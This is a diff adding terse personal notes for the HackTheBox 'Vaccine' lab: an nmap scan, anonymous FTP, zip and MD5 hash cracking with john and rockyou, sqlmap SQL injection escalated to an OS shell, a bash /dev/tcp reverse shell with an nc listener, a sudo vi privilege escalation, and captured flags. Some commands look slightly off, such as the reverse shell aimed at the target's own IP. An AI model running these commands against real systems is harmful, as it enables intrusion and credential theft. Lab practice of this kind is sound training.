@@ -363,3 +363,68 @@ echo $PATH
 /usr/bin/bugtracker
 nano /root/root.txt
 af13b0bee69f8a877c3faf667f7beacf
+
+# Vaccine
+HackTheBox Vaccine Walkthrough
+cd ~/Public
+10.129.254.156
+nmap -F -sV -sC 10.129.254.156
+ftp
+anonymous
+backup.zip
+
+ftp -p anonymous@10.129.254.156
+get backup.zip
+unzip backup.zip
+zip2john backup.zip > backup.hash
+zip2john
+git clone https://github.com/openwall/john
+cd john/src
+./configure && make
+ln -s john zip2john
+sudo find / -name zip2john 2>/dev/null
+~/Public/john/run/zip2john ~/Public/backup.zip > ~/Public/backup.hash
+nano ~/Public/backup.hash
+sudo find / -name wordlists 2>/dev/null
+sudo find / -name rockyou 2>/dev/null
+sudo find / -name seclists 2>/dev/null
+
+git clone https://gitlab.com/kalilinux/packages/wordlists.git
+cd wordlists
+gunzip rockyou.txt.gz
+sudo john --wordlist=~/Public/wordlists/rockyou.txt backup.hash
+john ~/Public/backup.hash --wordlist=~/Public/wordlists/rockyou.txt
+
+~/Public/john/run/john ~/Public/backup.hash --wordlist==/home/ubuntu/Public/wordlists/rockyou.txt
+
+741852963
+unzip backup.zip
+head index.php
+rainbow
+2cb42f8734ea607eefed3b70af13bbd3  qwerty789
+
+admin / qwerty789
+
+http://10.129.254.156/dashboard.php?search=a
+
+sqlmap -u 'http://10.129.254.156/dashboard.php?search=a' --cookie='PHPSESSID=tcer626cqoumebdilfbbib1l57'
+
+sqlmap.py -u 'http://10.129.254.156/dashboard.php?search=a' --cookie='PHPSESSID=ojq8sk0069d5h4uq96qr93c063' --os-shell
+
+--os-shell
+
+bash -c 'bash -i >& /dev/tcp/10.129.254.156/4444 0>&1'
+
+nc -lvnp 4444
+
+vi
+
+find / -type f -name user.txt 2>/dev/null
+cat /var/lib/postgresql/user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+whoami
+cat /root/root.txt
+dd6e058e814260bc70e9bbdef2715849
